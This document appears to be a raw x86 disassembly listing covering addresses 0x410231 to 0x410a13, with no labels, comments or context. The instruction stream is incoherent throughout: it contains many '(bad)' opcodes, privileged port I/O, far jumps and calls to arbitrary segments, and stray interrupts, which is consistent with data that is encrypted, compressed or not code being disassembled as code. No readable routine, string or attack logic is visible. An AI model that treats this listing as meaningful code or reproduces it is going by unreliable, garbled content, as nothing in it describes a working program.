  410231:	retf   0xe705
  410234:	mov    esp,0xe0ab8800
  410239:	fcom   DWORD PTR [eax]
  41023b:	cmp    eax,0xb1a59bd9
  410240:	xchg   ebp,eax
  410241:	dec    ebx
  410242:	pop    esp
  410243:	sbb    dh,cl
  410245:	sub    DWORD PTR [ebp-0xd],esp
  410248:	or     ch,cl
  41024a:	fldcw  WORD PTR [ecx+0x379ea7c9]
  410250:	mov    ecx,0x5a8a9ed5
  410255:	inc    esp
  410256:	stc    
  410257:	shl    BYTE PTR [ebp+0x49],0x45
  41025b:	scas   eax,DWORD PTR es:[edi]
  41025c:	mov    dl,0x46
  41025e:	mov    DWORD PTR [edx+0x49cb8931],esp
  410264:	add    dl,BYTE PTR [edi+0x3]
  410267:	mov    ecx,eax
  410269:	retf   
  41026a:	std    
  41026b:	jge    0x410205
  41026d:	dec    esi
  41026e:	in     eax,0x56
  410270:	fisttp QWORD PTR [eax-0x133798c4]
  410276:	mov    DWORD PTR [esi+0x33e128e5],ecx
  41027c:	add    al,0x5e
  41027e:	pop    eax
  41027f:	cmp    al,0xc3
  410281:	inc    ebp
  410282:	and    eax,0x7a578cd4
  410287:	repnz loopne 0x4102fc
  41028a:	cmp    eax,0x9098913a
  41028f:	sub    eax,0xf3033807
  410294:	rcl    dl,0x9a
  410297:	mov    BYTE PTR [esi-0x6f],cl
  41029a:	sbb    eax,0x24d0c0d3
  41029f:	xor    BYTE PTR [eax+0x6],dl
  4102a2:	jbe    0x41025d
  4102a4:	mov    al,ds:0xe1c1f1fb
  4102a9:	sbb    BYTE PTR ds:0xd2ac5179,0x3b
  4102b0:	jo     0x410329
  4102b2:	jmp    0x41030c
  4102b4:	and    DWORD PTR [edx-0x6c],edi
  4102b7:	scas   eax,DWORD PTR es:[edi]
  4102b8:	sbb    al,0xff
  4102ba:	sbb    al,0x45
  4102bc:	jne    0x4102ae
  4102be:	das    
  4102bf:	mov    eax,ds:0x8ff01eae
  4102c4:	inc    edx
  4102c5:	xchg   ecx,eax
  4102c6:	popf   
  4102c7:	mov    dl,0x70
  4102c9:	cdq    
  4102ca:	inc    esp
  4102cb:	jae    0x41025f
  4102cd:	mov    BYTE PTR [edi-0x12],0x5f
  4102d1:	sbb    DWORD PTR [ecx-0x6d],0xffffff99
  4102d5:	xor    al,0xc2
  4102d8:	sub    DWORD PTR [ebp-0x5f55539],0xfffffff9
  4102df:	(bad)
  4102e2:	mov    edi,0x42725d7c
  4102e7:	push   cs
  4102e8:	and    bh,bh
  4102ea:	cmp    al,BYTE PTR [ebx+0x51]
  4102ed:	fs sub eax,0xb7f70ddc
  4102f3:	cmp    al,0x8a
  4102f5:	dec    ebp
  4102f6:	add    edx,ecx
  4102f8:	leave  
  4102f9:	test   eax,esp
  4102fb:	mov    bh,0x59
  4102fd:	js     0x4102f1
  4102ff:	nop
  410300:	ret    
  410301:	leave  
  410302:	lahf   
  410303:	sbb    eax,0xd970e2a9
  410308:	mov    bl,ah
  41030a:	iret   
  41030b:	and    ecx,DWORD PTR [esi+0x29]
  41030e:	adc    eax,0x5c0ec9d0
  410313:	jl     0x4102f2
  410315:	add    edx,DWORD PTR [ecx+edx*1+0xfe6b2dc]
  41031c:	cmp    ch,BYTE PTR [esi]
  41031e:	in     eax,0xf2
  410320:	cs inc BYTE PTR cs:[edx-0x648b655a]
  410328:	and    eax,0xa89eec94
  41032d:	lods   al,BYTE PTR ds:[esi]
  41032e:	push   ebx
  41032f:	pop    ecx
  410330:	mov    edi,0x395d3860
  410335:	xor    BYTE PTR [ecx],ah
  410337:	sub    dl,bl
  410339:	ins    BYTE PTR es:[edi],dx
  41033a:	arpl   WORD PTR [edi+0x1e71da75],dx
  410340:	push   cs
  410341:	jmp    0x9a1f:0x60e6c18f
  410348:	xor    bl,al
  41034a:	jl     0x4102f1
  41034c:	sub    BYTE PTR [ebx-0x29964f67],0x9
  410353:	lock enter 0x8bb7,0x3c
  410358:	add    eax,0xc8ec823b
  41035d:	retf   
  41035e:	mov    BYTE PTR [ecx+0x521ba944],dh
  410364:	dec    esp
  410365:	fsub   QWORD PTR [esi+0x3231a7ce]
  41036b:	loop   0x410307
  41036d:	xchg   esi,eax
  41036e:	and    ebx,ebp
  410370:	bound  ecx,QWORD PTR [eax-0x172a57b1]
  410376:	dec    edi
  410377:	push   ss
  410378:	addr16 pop esi
  41037a:	mov    ebx,0x46cbc110
  41037f:	inc    eax
  410380:	sbb    edx,0xd0f41d06
  410386:	cmp    DWORD PTR [edx],edx
  410388:	jno    0x410338
  41038a:	pop    ebp
  41038b:	fstp   QWORD PTR [ebp-0x10]
  41038e:	sbb    edx,edx
  410390:	xchg   ebp,eax
  410391:	add    al,0x71
  410393:	jae    0x4103a1
  410395:	pop    edi
  410396:	mov    gs,WORD PTR [ebx]
  410398:	out    dx,eax
  410399:	adc    BYTE PTR [esi],bh
  41039b:	or     al,0xd9
  41039d:	and    al,0x9e
  41039f:	sar    BYTE PTR [eax+0x7d9ea70],1
  4103a5:	push   edx
  4103a6:	sbb    DWORD PTR [ecx-0x62],esp
  4103a9:	fdivrp st(0),st
  4103ab:	daa    
  4103ac:	push   eax
  4103ad:	jg     0x410423
  4103af:	out    0x49,al
  4103b1:	dec    esp
  4103b2:	mov    ds:0xf8fa1643,eax
  4103b7:	popa   
  4103b8:	sub    DWORD PTR ds:0x71856076,edi
  4103be:	pop    ss
  4103bf:	out    dx,eax
  4103c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103c1:	je     0x4103c6
  4103c3:	cwde   
  4103c4:	or     ebx,DWORD PTR [ebx+0x4a]
  4103c7:	ins    DWORD PTR es:[edi],dx
  4103c8:	cli    
  4103c9:	in     eax,dx
  4103ca:	dec    esi
  4103cb:	xor    ah,BYTE PTR [esi]
  4103cd:	dec    eax
  4103ce:	iret   
  4103cf:	fwait
  4103d0:	xlat   BYTE PTR ds:[ebx]
  4103d1:	dec    esp
  4103d2:	jp     0x4103d2
  4103d4:	imul   ebp,DWORD PTR [ecx],0x6d1d6a45
  4103da:	or     ch,BYTE PTR [esi+0xa8ab53f]
  4103e0:	inc    edi
  4103e1:	int3   
  4103e2:	pop    ebp
  4103e3:	pop    ecx
  4103e4:	jmp    0xd756:0xfaffbb6a
  4103eb:	lds    edi,FWORD PTR [edi-0x7e]
  4103ee:	jnp    0x4103c2
  4103f0:	lds    edi,FWORD PTR [ebp-0x6]
  4103f3:	mov    ah,0x4c
  4103f5:	add    eax,0x1facd585
  4103fa:	mov    al,0x93
  4103fc:	in     eax,dx
  4103fd:	or     al,0x9
  4103ff:	xchg   edx,eax
  410400:	inc    esp
  410401:	xchg   ebp,eax
  410402:	pop    ss
  410403:	ds sbb al,bh
  410406:	ins    BYTE PTR es:[edi],dx
  410407:	push   ecx
  410408:	cs and al,0xd0
  41040b:	mov    ah,0x73
  41040d:	pop    es
  41040e:	jae    0x410410
  410410:	fcomp  QWORD PTR [edi-0x61]
  410413:	inc    ebp
  410414:	mov    BYTE PTR [edx],dl
  410416:	push   cs
  410417:	data16 fwait
  410419:	jnp    0x410459
  41041b:	pop    es
  41041c:	pop    esi
  41041d:	lds    edi,FWORD PTR ds:0xbe44f48d
  410423:	ja     0x410400
  410425:	mov    edx,edx
  410427:	stos   DWORD PTR es:[edi],eax
  410428:	or     ah,BYTE PTR [edi-0x21eb5c5d]
  41042e:	cmp    dh,BYTE PTR [edx]
  410430:	cdq    
  410431:	pop    ecx
  410432:	popf   
  410433:	(bad)  
  410434:	(bad)  
  410435:	or     bh,BYTE PTR [esi-0x7c]
  410438:	gs jp  0x41048d
  41043b:	icebp  
  41043c:	xchg   edi,eax
  41043d:	xlat   BYTE PTR ds:[ebx]
  41043e:	leave  
  41043f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410440:	pop    ss
  410441:	icebp  
  410442:	rcr    DWORD PTR [edi],cl
  410444:	int    0x3a
  410446:	or     eax,0x8f901536
  41044b:	mov    BYTE PTR [esi-0x46],0xf5
  41044f:	pop    ebx
  410450:	int3   
  410451:	adc    edx,esi
  410453:	sub    eax,0xd9825d2f
  410458:	mov    ah,0x5c
  41045a:	cmp    ebx,DWORD PTR [edx+0x62a73fdf]
  410460:	ins    DWORD PTR es:[edi],dx
  410461:	xchg   BYTE PTR [ecx-0x76],ch
  410464:	pop    es
  410465:	mov    edx,0x5b58c6f3
  41046a:	jge    0x41044c
  41046c:	ja     0x41042b
  41046e:	mov    bl,0x14
  410470:	repz mov cs,WORD PTR [esi]
  410473:	sub    al,0x21
  410475:	call   0x631e:0x4629dc62
  41047c:	jns    0x410485
  41047e:	and    BYTE PTR [esi+eiz*1],al
  410481:	test   al,0x6b
  410483:	(bad)  
  410485:	mov    ecx,0xdcc36456
  41048a:	xor    al,0x4a
  41048c:	fwait
  41048d:	xor    ebp,eax
  41048f:	pop    ds
  410490:	xor    al,0xd1
  410492:	and    eax,0x3591886a
  410497:	arpl   WORD PTR [ebx+0x3fb8a303],cx
  41049d:	ins    BYTE PTR es:[edi],dx
  41049e:	scas   eax,DWORD PTR es:[edi]
  41049f:	ins    BYTE PTR es:[edi],dx
  4104a0:	or     eax,0x6b49ceeb
  4104a5:	cmp    dh,BYTE PTR [esi]
  4104a7:	call   0x8f4f31a9
  4104ac:	shl    BYTE PTR [edi-0x57e9c0f1],1
  4104b2:	test   al,0x47
  4104b4:	cs xchg esp,eax
  4104b6:	test   DWORD PTR [ebx],edi
  4104b8:	imul   ebx,DWORD PTR [ebx-0x14848c7a],0xfffffff4
  4104bf:	pop    edx
  4104c0:	or     DWORD PTR [ecx-0x7e],0x4e79a4e8
  4104c7:	idiv   ebx
  4104c9:	sti    
  4104ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104cb:	xchg   DWORD PTR [eax-0x20],ebx
  4104ce:	sti    
  4104cf:	or     al,0x89
  4104d1:	sub    ebx,DWORD PTR [edi-0x73]
  4104d4:	sbb    eax,0xc8754188
  4104d9:	or     BYTE PTR [edx-0x1e4bbfd8],bl
  4104df:	xor    al,0x4c
  4104e1:	in     al,dx
  4104e2:	hlt    
  4104e3:	jg     0x41053e
  4104e5:	ret    
  4104e6:	xor    al,0x35
  4104e8:	ja     0x4104fa
  4104ea:	cmp    bh,BYTE PTR [ebx-0x18]
  4104ed:	sub    eax,0xa520c3d5
  4104f2:	adc    BYTE PTR [esp+ebp*2-0x1a],dl
  4104f6:	clc    
  4104f7:	bound  ecx,QWORD PTR [edi+0x3809e7c3]
  4104fd:	cmp    edx,DWORD PTR [ecx+0x7555f5c4]
  410503:	push   ss
  410504:	pop    esp
  410505:	(bad)  
  410506:	pop    ebp
  410507:	iret   
  410508:	shr    BYTE PTR [ecx],0x1a
  41050b:	repz xor BYTE PTR [edi+edx*1],ch
  41050f:	gs cmp eax,0x91babefc
  410515:	push   ds
  410516:	cli    
  410517:	leave  
  410518:	add    DWORD PTR [edi],ecx
  41051a:	stos   BYTE PTR es:[edi],al
  41051b:	ds imul esp,esi,0xedb23d14
  410522:	sub    BYTE PTR [esi+0x5c],ah
  410525:	rol    al,1
  410527:	jl     0x410579
  410529:	iret   
  41052a:	aas    
  41052b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41052c:	adc    BYTE PTR [ebp-0x4f],dh
  41052f:	or     BYTE PTR [edx],bl
  410531:	sar    dl,0x49
  410534:	popa   
  410535:	and    BYTE PTR [eax+ecx*4-0x28],0x20
  41053a:	dec    esi
  41053b:	lods   al,BYTE PTR ds:[esi]
  41053c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41053d:	dec    ebp
  41053e:	into   
  41053f:	fcmove st,st(2)
  410541:	leave  
  410542:	call   0xeab48ef7
  410547:	test   DWORD PTR [eax-0x557b2ea],ebp
  41054d:	mov    bh,0xa2
  41054f:	fisttp WORD PTR [eax]
  410551:	push   cs
  410552:	fsub   QWORD PTR ds:0x6283338
  410558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410559:	or     ch,BYTE PTR [ecx]
  41055b:	fisttp WORD PTR ss:[edi]
  41055e:	cmp    al,0xe3
  410560:	nop
  410561:	into   
  410562:	sub    ecx,DWORD PTR [eax+0x5eb2458]
  410568:	shl    BYTE PTR [ebp-0xd],0x26
  41056c:	xchg   esi,eax
  41056d:	sbb    cl,BYTE PTR [edi+0x6b]
  410570:	or     edx,ecx
  410572:	call   0x73bc87c0
  410577:	sbb    al,0x5d
  410579:	loope  0x4105b9
  41057b:	jne    0x4105d7
  41057d:	sub    DWORD PTR [ebx-0x22c45ffb],esi
  410583:	xchg   ebp,eax
  410584:	xchg   ebx,eax
  410585:	pop    ecx
  410586:	test   al,0x41
  410589:	adc    bh,BYTE PTR [eax-0x71f79f5b]
  41058f:	mov    ds:0xdb26eddf,eax
  410594:	out    dx,eax
  410595:	data16 or BYTE PTR [eax-0x370336ac],0xe9
  41059d:	shl    DWORD PTR [ecx-0x6f865ced],1
  4105a3:	aas    
  4105a4:	vmptrld QWORD PTR [ebx-0x2f]
  4105a8:	mov    ebp,0x300c4f0
  4105ad:	ror    DWORD PTR fs:[eax-0x12712bdc],1
  4105b4:	out    dx,al
  4105b5:	mov    esi,DWORD PTR [esi+0x536ebf26]
  4105bb:	cld    
  4105bc:	stos   DWORD PTR es:[edi],eax
  4105bd:	lahf   
  4105be:	ja     0x410551
  4105c0:	push   0x4ca6d47a
  4105c5:	scas   al,BYTE PTR es:[edi]
  4105c6:	mov    ch,0x3c
  4105c8:	fst    QWORD PTR [edx]
  4105ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105cb:	mov    eax,ds:0x4946b1a4
  4105d0:	mov    al,0xb5
  4105d2:	push   0xffffff91
  4105d4:	jns    0x41057d
  4105d6:	adc    BYTE PTR [edx+0x6f432781],dh
  4105dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105dd:	inc    BYTE PTR [esi]
  4105df:	add    DWORD PTR [ecx+0x75],edi
  4105e2:	push   esi
  4105e3:	push   ss
  4105e4:	sub    al,0x26
  4105e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105e7:	outs   dx,BYTE PTR ds:[esi]
  4105e8:	int    0x5c
  4105ea:	fs push ebx
  4105ec:	pop    ebx
  4105ed:	mov    ebx,es
  4105ef:	icebp  
  4105f0:	es mov edi,0x31acb50c
  4105f6:	sbb    al,0x84
  4105f8:	call   0x6cb349f3
  4105fd:	cmp    al,0x84
  4105ff:	(bad)  
  410600:	ret    0x94
  410603:	ds (bad) 
  410606:	sub    dh,BYTE PTR [edx-0x23]
  410609:	mov    ah,BYTE PTR [esi]
  41060b:	sub    esi,0x477de696
  410611:	aas    
  410612:	add    ecx,ebx
  410614:	xchg   edx,eax
  410615:	push   esp
  410616:	lock and al,0x10
  410619:	cmp    BYTE PTR [ebx],al
  41061b:	inc    BYTE PTR [edi+0xed150d1]
  410621:	or     BYTE PTR [eax+ecx*2+0x78],dh
  410625:	jo     0x4105c3
  410627:	dec    edx
  410628:	std    
  410629:	sbb    eax,0xe082bf71
  41062e:	test   eax,0x4da141f0
  410633:	(bad)  [ebx-0x6c0a90ec]
  410639:	in     eax,0x80
  41063b:	push   esi
  41063c:	and    edx,DWORD PTR [esi+0x33a0af85]
  410642:	jbe    0x410608
  410644:	mov    eax,ds:0xc8e8a26a
  410649:	scas   al,BYTE PTR es:[edi]
  41064a:	dec    esi
  41064b:	mov    ebp,DWORD PTR [esi-0x76]
  41064e:	mov    BYTE PTR [esi+0x6b05cac3],bl
  410654:	sahf   
  410655:	push   0xffffff90
  410657:	inc    esi
  410658:	and    eax,DWORD PTR [ecx-0x7c4f8809]
  41065e:	sub    eax,0xdb821d54
  410663:	pop    ss
  410664:	in     eax,0x2d
  410666:	mov    bl,0xa4
  410668:	repz dec ebx
  41066a:	(bad)  
  41066b:	and    ah,dl
  41066d:	jp     0x410671
  41066f:	fidiv  DWORD PTR [ebp+0x7c93986d]
  410675:	mov    BYTE PTR [edi-0x64],bl
  410678:	(bad)  
  410679:	xchg   edi,eax
  41067a:	(bad)
  41067f:	or     eax,0xbec8aa8d
  410684:	test   al,0x87
  410686:	jecxz  0x4106c5
  410688:	pop    es
  410689:	jne    0x41063a
  41068b:	and    edx,DWORD PTR [esi-0x70719875]
  410691:	int3   
  410692:	pop    edx
  410693:	loopne 0x410686
  410695:	shl    DWORD PTR [esi],0x9
  410698:	loope  0x4106c7
  41069a:	sbb    eax,DWORD PTR [ebp+0x55b10c0b]
  4106a0:	inc    eax
  4106a1:	ds push ecx
  4106a3:	arpl   WORD PTR [esp+eiz*4-0x64],ax
  4106a7:	add    al,0x9c
  4106a9:	sbb    ebx,DWORD PTR [edx-0x33af564b]
  4106af:	out    0xd1,eax
  4106b1:	call   0x82ab:0x5870521c
  4106b8:	sti    
  4106b9:	(bad)  [ecx+0x78abe88e]
  4106bf:	push   edx
  4106c0:	push   cs
  4106c1:	sub    BYTE PTR ds:0xf0d07d6a,0x84
  4106c8:	jp     0x410653
  4106ca:	mov    ecx,0x145c3ac7
  4106cf:	xchg   ebp,eax
  4106d0:	jmp    0x41073c
  4106d2:	and    ebx,DWORD PTR [esi-0x74cc6065]
  4106d8:	icebp  
  4106d9:	retf   
  4106da:	adc    BYTE PTR [ecx-0xa3817cb],dh
  4106e0:	xchg   BYTE PTR [edi-0x4b],bl
  4106e3:	ds push edi
  4106e5:	add    al,0x19
  4106e7:	call   0xe29:0xce0603b1
  4106ee:	jbe    0x41072c
  4106f0:	mov    esi,0x9895b261
  4106f5:	lock test DWORD PTR [ecx-0x39],ebp
  4106f9:	inc    ebp
  4106fa:	xlat   BYTE PTR ds:[ebx]
  4106fb:	sbb    eax,0x77932efd
  410700:	(bad)  
  410701:	in     eax,dx
  410702:	add    DWORD PTR [ebx+0x75a9bc4a],eax
  410708:	or     eax,0xb6fb8431
  41070d:	call   0xc253:0xf458f82e
  410714:	inc    edx
  410715:	int    0xcc
  410717:	add    al,0xc6
  410719:	pop    ss
  41071a:	mov    al,ds:0x6a15cc40
  41071f:	lods   al,BYTE PTR ds:[esi]
  410720:	in     al,0x96
  410722:	xor    al,0x4f
  410724:	pop    esi
  410725:	shl    ah,0xaf
  410728:	ror    DWORD PTR [edx],1
  41072a:	(bad)  
  41072b:	fcom   DWORD PTR [ebp+0x5c]
  41072e:	nop
  41072f:	mov    DWORD PTR [edi+0x5e],ebp
  410732:	ins    BYTE PTR es:[edi],dx
  410733:	pop    es
  410734:	out    0x59,al
  410736:	add    eax,0x8cf0a9e8
  41073b:	fabs   
  41073d:	fisubr WORD PTR [edx-0x56]
  410740:	lea    ecx,[edi-0x4dcc8cb6]
  410746:	pop    esi
  410747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410748:	sar    DWORD PTR [ebx-0x1],1
  41074b:	and    ah,al
  41074d:	enter  0xf8e8,0x53
  410751:	push   0xc3633d9b
  410756:	aaa    
  410757:	pop    ds
  410758:	and    ebp,edx
  41075a:	mov    ebp,0xcd43e25f
  41075f:	in     al,0xd0
  410761:	and    al,0x78
  410763:	cmp    ebx,DWORD PTR [ecx+0x5c6e2fde]
  410769:	fisubr WORD PTR [edx+ecx*8-0x71483cb3]
  410771:	test   BYTE PTR [ecx],0x73
  410774:	bound  ecx,QWORD PTR [esi+edx*4]
  410777:	ret    
  410778:	jmp    0xc9fd352c
  41077d:	mov    cl,0x62
  41077f:	leave  
  410780:	adc    DWORD PTR [eax],ebp
  410782:	(bad)  [ecx+0x7e]
  410785:	dec    ebx
  410786:	aad    0x42
  410788:	js     0x410744
  41078a:	ins    BYTE PTR es:[edi],dx
  41078b:	lods   al,BYTE PTR ds:[esi]
  41078c:	stos   BYTE PTR es:[edi],al
  41078d:	ret    0x9222
  410790:	shl    BYTE PTR [ecx+0x4a],cl
  410793:	mov    eax,ds:0x8f97f89b
  410798:	pop    esi
  410799:	pop    eax
  41079a:	rol    al,cl
  41079c:	jmp    DWORD PTR [edi+0x4f]
  41079f:	outs   dx,DWORD PTR ds:[esi]
  4107a0:	mov    ch,0xb9
  4107a2:	mov    BYTE PTR [ebx+ecx*8+0x496b8dd],dl
  4107a9:	xchg   ebp,eax
  4107aa:	das    
  4107ab:	mov    eax,0xf9c96d06
  4107b0:	inc    edi
  4107b1:	out    dx,al
  4107b2:	jmp    0x45fe:0xa46ee407
  4107b9:	hlt    
  4107ba:	das    
  4107bb:	loopne 0x4107f4
  4107bd:	aad    0x3d
  4107bf:	sbb    ch,0x2d
  4107c2:	lods   eax,DWORD PTR ds:[esi]
  4107c3:	popa   
  4107c4:	sbb    al,0x6c
  4107c6:	mov    al,0x72
  4107c8:	jmp    0xd781:0x2971051a
  4107cf:	sub    esi,DWORD PTR [edx+edx*4-0x52]
  4107d3:	or     DWORD PTR [ebp+ebx*4-0x1],ecx
  4107d7:	dec    esp
  4107d8:	enter  0x3263,0x6
  4107dc:	mov    dl,0x9f
  4107de:	rol    eax,0xdf
  4107e1:	dec    BYTE PTR [ebx+0x7d]
  4107e4:	mov    DWORD PTR ds:0xaca454c4,ebp
  4107ea:	push   ebp
  4107eb:	cmp    BYTE PTR [eax-0x2fe1cdf2],bl
  4107f1:	mov    ch,0xc1
  4107f3:	loop   0x41084f
  4107f5:	inc    esi
  4107f6:	iret   
  4107f7:	gs fs loop 0x410860
  4107fb:	outs   dx,BYTE PTR ds:[esi]
  4107fc:	xlat   BYTE PTR ds:[ebx]
  4107fd:	inc    esp
  4107fe:	xchg   esp,eax
  4107ff:	or     DWORD PTR [ecx+0x314ff0cd],ecx
  410805:	push   cs
  410806:	test   eax,0x13c19eaf
  41080b:	jg     0x410813
  41080d:	imul   edx,DWORD PTR [edx],0xffffffa7
  410810:	push   0xffffff97
  410812:	imul   ebx,DWORD PTR [eax],0xffffffc0
  410815:	mul    DWORD PTR [ebx]
  410817:	iret   
  410818:	mov    eax,ds:0xa1e9d90a
  41081d:	mov    al,0x3
  41081f:	xchg   ebx,eax
  410820:	fstp   DWORD PTR [ecx+0x5f7cc2d6]
  410826:	cmp    DWORD PTR [ebp+0x3f],ecx
  410829:	es mov dh,0xb2
  41082c:	push   ecx
  41082d:	xor    DWORD PTR [ecx],esp
  41082f:	mov    bh,0x46
  410831:	pusha  
  410832:	sar    DWORD PTR ds:0x1dd34847,1
  410838:	out    0x66,eax
  41083a:	lea    edi,[eax+edi*2]
  41083d:	js     0x41083d
  41083f:	vorpd  ymm6,ymm5,YMMWORD PTR [ebp+0x5a]
  410844:	pop    ebx
  410845:	stos   BYTE PTR es:[edi],al
  410846:	jecxz  0x41082a
  410848:	cmp    dl,dl
  41084a:	cld    
  41084b:	inc    esi
  41084d:	or     BYTE PTR [ecx-0x13b95165],dh
  410853:	xor    al,0xee
  410855:	out    0x45,eax
  410857:	and    eax,0xe38637e9
  41085c:	pop    esp
  41085d:	icebp  
  41085e:	xchg   BYTE PTR [esp+eax*1+0x6439fb9],bh
  410865:	pop    es
  410866:	jns    0x4108b7
  410868:	cmpxchg BYTE PTR [esi+ecx*1],dl
  41086c:	xchg   ebp,eax
  41086d:	fldcw  WORD PTR [edx-0x2e]
  410870:	(bad)  
  410871:	push   ebx
  410872:	sub    edi,DWORD PTR [ebx+0x42]
  410875:	in     al,dx
  410876:	sbb    al,0xae
  410878:	xor    DWORD PTR [ebp-0x6e],edx
  41087b:	xlat   BYTE PTR ds:[ebx]
  41087c:	in     al,0x58
  41087e:	pop    edi
  41087f:	adc    al,0x7a
  410881:	sti    
  410882:	sbb    BYTE PTR [ecx],0xb4
  410885:	adc    esp,0xa4723ee
  41088b:	push   0x183f83bc
  410890:	fs je  0x4108eb
  410893:	in     al,dx
  410894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410895:	sub    ebp,0x12fa44c
  41089b:	or     ebx,DWORD PTR [eax-0x700f0afe]
  4108a1:	fsubr  st(4),st
  4108a3:	jle    0x41083d
  4108a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a6:	mov    cs,esp
  4108a8:	xchg   ebx,eax
  4108a9:	mov    edx,edi
  4108ab:	xor    eax,0x94bf1fc
  4108b0:	cld    
  4108b1:	mov    esi,0x3fb3f96e
  4108b6:	(bad)  [ebp+0x6148cd20]
  4108bc:	aaa    
  4108bd:	mov    eax,0x2e905b47
  4108c2:	pop    eax
  4108c3:	adc    BYTE PTR [eax+0x6b],dh
  4108c6:	and    BYTE PTR [ebx+0x373c1459],bl
  4108cc:	inc    esi
  4108cd:	add    DWORD PTR ds:0x97903ea6,esi
  4108d3:	enterw 0x5380,0x4a
  4108d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d9:	inc    DWORD PTR [ebx+0x53093cd3]
  4108df:	stos   DWORD PTR es:[edi],eax
  4108e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e1:	idiv   BYTE PTR [ecx]
  4108e3:	cs ds jbe 0x410928
  4108e7:	sbb    bh,dh
  4108e9:	add    ch,BYTE PTR [esp+edx*4+0x1b982f04]
  4108f0:	cmp    bh,bh
  4108f2:	into   
  4108f3:	xor    BYTE PTR [ebx+0x2e5f2bf2],0xf5
  4108fa:	pop    esp
  4108fb:	jnp    0x41088a
  4108fd:	add    eax,0x236fcf51
  410902:	jnp    0x4108ad
  410904:	jb     0x410904
  410906:	sar    BYTE PTR [ecx-0xb],cl
  410909:	maskmovq mm4,(bad)
  41090a:	mul    DWORD PTR [edx-0x7d]
  41090d:	cs gs retf 
  410910:	xchg   DWORD PTR [edi],ebx
  410912:	icebp  
  410913:	pusha  
  410914:	or     esp,ecx
  410916:	jnp    0x410983
  410918:	sub    bh,BYTE PTR [eax-0x23]
  41091b:	sbb    DWORD PTR [ebx-0x420c280f],0xffffffbe
  410922:	sub    eax,0xd14590fa
  410927:	shr    DWORD PTR [ebp-0x64],1
  41092a:	jmp    0x89a32bc7
  41092f:	rol    DWORD PTR [edx+ebp*1+0x53049db],0x90
  410937:	(bad)  
  410939:	dec    edx
  41093a:	adc    al,0xda
  41093c:	je     0x410961
  41093e:	popa   
  41093f:	stos   DWORD PTR es:[edi],eax
  410940:	lea    edx,[ebx-0x2a4a6ae6]
  410946:	inc    eax
  410947:	pop    edx
  410948:	pop    edi
  410949:	xchg   edx,eax
  41094a:	sub    DWORD PTR [edi+0x13],ebp
  41094d:	imul   esi,DWORD PTR [ebp+edi*8+0x2937b2d8],0x6a
  410955:	sub    al,0x35
  410957:	mov    eax,0x2dbff7cf
  41095c:	jl     0x4109ad
  41095e:	xchg   edi,eax
  41095f:	(bad)  
  410960:	ja     0x41090e
  410962:	xor    ah,cl
  410964:	inc    ebx
  410965:	inc    esi
  410966:	fadd   DWORD PTR [edx+0xaddd92e]
  41096c:	jnp    0x4109df
  41096e:	outs   dx,BYTE PTR ds:[esi]
  41096f:	and    ch,ch
  410971:	xchg   ebx,eax
  410972:	cs loope 0x41097b
  410975:	and    bl,BYTE PTR [ebp-0x175af34e]
  41097b:	xchg   edi,eax
  41097c:	mov    ebp,0x8f08abeb
  410981:	xor    eax,0x71aa05ec
  410986:	gs inc ecx
  410988:	pop    eax
  410989:	sahf   
  41098a:	mov    al,0xb
  41098c:	test   DWORD PTR [ecx+0x4a],esi
  41098f:	dec    BYTE PTR [eax-0x3b]
  410992:	loope  0x410a00
  410994:	xor    bh,BYTE PTR [ecx]
  410996:	test   eax,0x65414023
  41099b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41099c:	daa    
  41099d:	shl    cl,1
  41099f:	pop    edx
  4109a0:	sahf   
  4109a1:	lds    esi,FWORD PTR [eax]
  4109a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109a4:	scas   al,BYTE PTR es:[edi]
  4109a5:	inc    ebp
  4109a6:	sahf   
  4109a7:	jecxz  0x410938
  4109a9:	cmp    cl,BYTE PTR [ebp-0xec9d2c5]
  4109af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109b0:	aam    0x4b
  4109b2:	retf   
  4109b3:	pop    ebp
  4109b4:	jne    0x4109a7
  4109b6:	xor    edx,esi
  4109b8:	icebp  
  4109b9:	jb     0x410a31
  4109bb:	mov    bh,0x80
  4109bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109be:	or     eax,0x6824247e
  4109c3:	sbb    al,0xee
  4109c5:	xor    edx,DWORD PTR [esi]
  4109c7:	scas   eax,DWORD PTR es:[edi]
  4109c8:	rol    DWORD PTR [esi-0x7],0x15
  4109cc:	inc    esp
  4109cd:	fidivr DWORD PTR [esi+0x11]
  4109d0:	arpl   WORD PTR [ecx],si
  4109d2:	aam    0xac
  4109d4:	add    al,BYTE PTR [esi+0x2b]
  4109d7:	jne    0x410999
  4109d9:	adc    eax,0x8e67a535
  4109de:	int3   
  4109df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109e0:	popf   
  4109e1:	imul   edx,DWORD PTR [ecx-0x35c8ccf8],0x259fcf3c
  4109eb:	mov    ch,0x69
  4109ed:	inc    esp
  4109ee:	pop    esi
  4109ef:	push   edi
  4109f0:	add    BYTE PTR [edi-0x24],al
  4109f3:	and    DWORD PTR [ecx+0x35],ebx
  4109f6:	in     eax,0xf9
  4109f8:	inc    ebx
  4109f9:	adc    DWORD PTR [eax-0x6afa8c0e],ebp
  4109ff:	mov    eax,0x872ebd92
  410a04:	out    dx,al
  410a05:	fninit 
  410a07:	dec    ebx
  410a09:	out    dx,eax
  410a0a:	js     0x410a1b
  410a0c:	xchg   ebp,eax
  410a0d:	sub    BYTE PTR [esi-0x39],ch
  410a10:	fdiv   QWORD PTR [esp+edx*1]
  410a13:	push   ebx
